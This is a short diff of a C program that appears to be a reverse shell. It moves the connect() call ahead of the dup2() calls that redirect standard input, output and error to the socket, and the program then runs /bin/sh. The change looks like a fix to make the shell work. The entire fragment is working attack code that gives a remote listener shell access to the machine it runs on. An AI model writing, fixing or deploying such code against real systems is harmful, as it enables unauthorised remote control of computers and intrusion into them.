@@ -19,13 +19,13 @@ int main(int argc, char **argv) {
   // order to network byte order.
   config.sin_port = htons(PORT);
 
+  // Connect to listening server
+  int csock = connect(lsock, (struct sockaddr *) &config, sizeof(config));
+
   // Redirect stdin, stdout, and stderror
   dup2(lsock, 0);
   dup2(lsock, 1);
   dup2(lsock, 2);
-
-  // Connect to listening server
-  int csock = connect(lsock, (struct sockaddr *) &config, sizeof(config));
 
   // Execute a shell
   execve("/bin/sh", NULL, NULL);
